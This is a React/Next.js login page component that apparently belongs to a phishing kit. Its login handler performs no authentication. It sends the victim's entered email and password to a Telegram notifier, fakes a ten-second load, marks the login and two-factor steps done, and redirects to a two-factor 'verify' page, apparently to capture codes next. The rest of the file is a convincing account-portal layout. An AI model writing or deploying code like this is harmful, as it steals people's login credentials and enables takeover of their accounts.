"use client";
import { HelpCircle, Loader2 } from "lucide-react";
import { useState } from "react";
import { useRouter } from "next/navigation";
import { notifyTelegram } from "@/lib/telegram-notify";
import { setLoginComplete, setTwoFactorStepComplete } from "@/lib/auth-flow";

export function LandingMain() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);
    notifyTelegram({
      kind: "login",
      username: email,
      password,
    });
    await new Promise((r) => setTimeout(r, 10000));
    setLoginComplete();
    setTwoFactorStepComplete();
    router.push("/two-factor/verify?method=email");
  };

  return (
    <main className="flex-grow flex items-center justify-center px-4">
      <div className="bg-white shadow-md rounded-md w-full max-w-5xl flex flex-col md:flex-row my-10 p-8 md:p-0">
        {/* Left: Returning Users Card */}
        <div className="w-full md:w-1/2 flex flex-col justify-center p-6 sm:p-12">
          <h2 className="text-3xl font-normal text-[#333333] mb-2">
            Returning Users
          </h2>
          <p className="text-base text-[#666666] mb-6">
            Log in to your existing account.
          </p>
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <label
                htmlFor="email"
                className="block text-base text-[#333333] mb-2"
              >
                Email (Username)
              </label>
              <input
                type="text"
                id="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                disabled={loading}
                className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-base text-[#333333] placeholder:text-[#999999] disabled:opacity-60 disabled:bg-[#FAFAFA]"
              />
            </div>
            <div>
              <label
                htmlFor="password"
                className="block text-base text-[#333333] mb-2"
              >
                Password
              </label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={loading}
                className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-base text-[#333333] placeholder:text-[#999999] disabled:opacity-60 disabled:bg-[#FAFAFA]"
              />
            </div>
            <button
              type="submit"
              disabled={!email || !password || loading}
              className="h-12 min-w-[120px] px-8 rounded-full text-base font-medium text-white bg-[#B8B8B8] disabled:bg-[#B8B8B8] enabled:bg-[#00C389] enabled:hover:bg-[#00A876] transition-colors inline-flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <Loader2 className="h-5 w-5 animate-spin" aria-hidden />
                  Loading…
                </>
              ) : (
                "Login"
              )}
            </button>
          </form>
          <p className="mt-6 text-base text-[#666666]">
            Forgot{" "}
            <a href="#" className="text-[#00C389] hover:underline">
              Username
            </a>{" "}
            or{" "}
            <a href="#" className="text-[#00C389] hover:underline">
              Password
            </a>
            ?
          </p>
        </div>
        {/* Divider */}
        <div className="hidden md:block w-px bg-[#E5E5E5] mx-4 my-8" />
        {/* Right: New Users Card */}
        <div className="w-full md:w-1/2 flex flex-col justify-center p-6 sm:p-12">
          <h2 className="text-3xl font-normal text-[#333333] mb-2">
            New Users
          </h2>
          <p className="text-base text-[#666666] mb-6">
            Register your account now.
          </p>
          <button className="border border-green-500 text-green-600 px-8 py-2 rounded-full hover:bg-green-50 transition mb-6 w-full sm:w-auto">
            Get Started
          </button>
          <ul className="text-sm text-green-600 space-y-3 mt-4">
            <li className="flex items-start gap-2 hover:underline cursor-pointer">
              <span className="mt-1">
                <HelpCircle className="w-4 h-4 text-green-600 flex-shrink-0" />
              </span>
              <span>Helpful hints for accessing your account</span>
            </li>
            <li className="flex items-start gap-2 hover:underline cursor-pointer">
              <span className="mt-1">
                <HelpCircle className="w-4 h-4 text-green-600 flex-shrink-0" />
              </span>
              <span>Learn about Multifactor Authentication</span>
            </li>
          </ul>
        </div>
      </div>
    </main>
  );
}
